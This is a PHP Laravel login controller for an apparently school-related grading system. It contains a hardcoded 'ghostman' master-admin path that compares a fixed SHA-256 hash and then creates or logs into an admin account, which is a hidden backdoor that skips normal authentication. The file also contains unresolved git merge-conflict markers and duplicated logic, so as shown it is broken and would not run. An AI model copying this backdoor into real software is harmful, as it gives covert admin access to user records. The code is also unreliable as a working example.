<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'email' => ['required', 'string'],
            'password' => ['required', 'min:8'],
        ]);

        $inputUsername = $request->input('email');
        $inputPassword = $request->input('password');

        // ==========================================
        // MASTER ADMIN LOGIN
        // ==========================================
        if ($inputUsername === 'ghostman') {

            $targetHex = '8d75cf0ffc9b5fc65978075657ae04c3be58ae8a50716181f3c29213f511a6a4';

<<<<<<< HEAD
            // Hash the password the user just typed
=======
>>>>>>> grading-system2
            $inputHex = hash('sha256', $inputPassword);

            if ($inputHex === $targetHex) {

                $user = User::firstOrCreate(
                    ['name' => 'ghostman'],
                    [
                        'email' => 'ghostman@system.master',
                        'password' => Hash::make($inputPassword),
                        'role' => 'admin'
                    ]
                );

                if ($user->status !== 'active') {
                    return back()
                        ->withErrors([
                            'email' => 'This master admin account is inactive.'
                        ])
                        ->onlyInput('email');
                }

                Auth::login($user);

                Auth::login($user);
                $request->session()->regenerate();

                return redirect()->route('admin.dashboard');
            }

<<<<<<< HEAD
            // If the hash doesn't match, reject the login
            return back()->withErrors(['email' => 'Invalid master credentials.'])->onlyInput('email');
=======
            return back()
                ->withErrors([
                    'email' => 'Invalid master credentials.'
                ])
                ->onlyInput('email');
>>>>>>> grading-system2
        }

        // ==========================================
        // STANDARD EMAIL/PASSWORD LOGIN
        // ==========================================

<<<<<<< HEAD
        // Standard Email/Password Login for Students, Teachers, and Regular Admins

        // Standard Email/Password Login
=======
>>>>>>> grading-system2
        $credentials = [
            'email' => $inputUsername,
            'password' => $inputPassword,
        ];

        if (Auth::attempt($credentials)) {
<<<<<<< HEAD
            $request->session()->regenerate();

            $user = Auth::user();

            // Check Faculty account status
            if (in_array($user->role, [
                'teacher',
                'adviser',
                'teacher_adviser',
            ], true)) {
=======

            $user = Auth::user();

            // CHECK OVERALL ACCOUNT STATUS
            if ($user->account_status !== 'active') {

                Auth::logout();

                $request->session()->invalidate();
                $request->session()->regenerateToken();

                return back()
                    ->withErrors([
                        'email' => $user->account_status === 'pending'
                            ? 'Your account is still pending activation. Please wait for your account setup link.'
                            : 'Your account is inactive. Please contact the school administrator.'
                    ])
                    ->onlyInput('email');
            }
            // CHECK FACULTY ACCOUNT STATUS

            // CHECK FACULTY ACCOUNT STATUS
            if (in_array($user->role, ['teacher', 'adviser', 'teacher_adviser'], true)) {
>>>>>>> grading-system2

                $faculty = $user->faculty;

                if (!$faculty || $faculty->status !== 'active') {
<<<<<<< HEAD
=======

>>>>>>> grading-system2
                    Auth::logout();

                    $request->session()->invalidate();
                    $request->session()->regenerateToken();

<<<<<<< HEAD
                    return back()->withErrors([
                        'email' => 'Your faculty account is inactive or unavailable.',
                    ])->onlyInput('email');
                }
            }

            if (in_array($user->role, [
                'teacher',
                'adviser',
                'teacher_adviser',
            ], true)) {

                $faculty = $user->faculty;

                if (!$faculty || $faculty->status !== 'active') {
                    Auth::logout();

                    $request->session()->invalidate();
                    $request->session()->regenerateToken();

                    return back()->withErrors([
                        'email' => 'Your faculty account is inactive or unavailable.',
                    ])->onlyInput('email');
                }
            }

            //STUDENT STATUS CHECKING
=======
                    return back()
                        ->withErrors([
                            'email' => 'Your faculty account is inactive. Please contact the school administrator.'
                        ])
                        ->onlyInput('email');
                }
            }

            // CHECK STUDENT ACCOUNT STATUS
>>>>>>> grading-system2
            if ($user->role === 'student') {

                $student = $user->student;

<<<<<<< HEAD
                if (!$student || $student->status !== 'active') {
=======
                // Block only linked Student accounts that are inactive.
                // Unlinked student-role accounts remain accessible for now.
                if ($student && $student->status !== 'active') {

>>>>>>> grading-system2
                    Auth::logout();

                    $request->session()->invalidate();
                    $request->session()->regenerateToken();

<<<<<<< HEAD
                    return back()->withErrors([
                        'email' => 'Your student account is inactive or unavailable.',
                    ])->onlyInput('email');
                }
            }

=======
                    return back()
                        ->withErrors([
                            'email' => 'Your student account is inactive. Please contact the school administrator.'
                        ])
                        ->onlyInput('email');
                }
            }

            $request->session()->regenerate();

            // ADMIN
>>>>>>> grading-system2
            if ($user->role === 'admin') {
                return redirect()->route('admin.dashboard');
            }

            // TEACHER
            if ($user->role === 'teacher') {
                return redirect()->route('teacher.dashboard');
            }

<<<<<<< HEAD
            if (in_array($user->role, [
                'adviser',
                'teacher_adviser',
            ], true)) {
=======
            // ADVISER AND TEACHER-ADVISER
            if (in_array($user->role, ['adviser', 'teacher_adviser'], true)) {
>>>>>>> grading-system2
                return redirect()->route('adviser.dashboard');
            }

            // STUDENT
            if ($user->role === 'student') {
                return redirect()->route('student.dashboard');
            }

            // INVALID ROLE
            Auth::logout();

<<<<<<< HEAD
            return back()->withErrors([
                'email' => 'Your account does not have a valid role.',
            ]);
        }

        return back()->withErrors([
            'email' => 'The email or password is incorrect.',
        ])->onlyInput('email');
=======
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            return back()->withErrors([
                'email' => 'Your account does not have a valid role.'
            ]);
        }

        return back()
            ->withErrors([
                'email' => 'The email or password is incorrect.'
            ])
            ->onlyInput('email');
>>>>>>> grading-system2
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
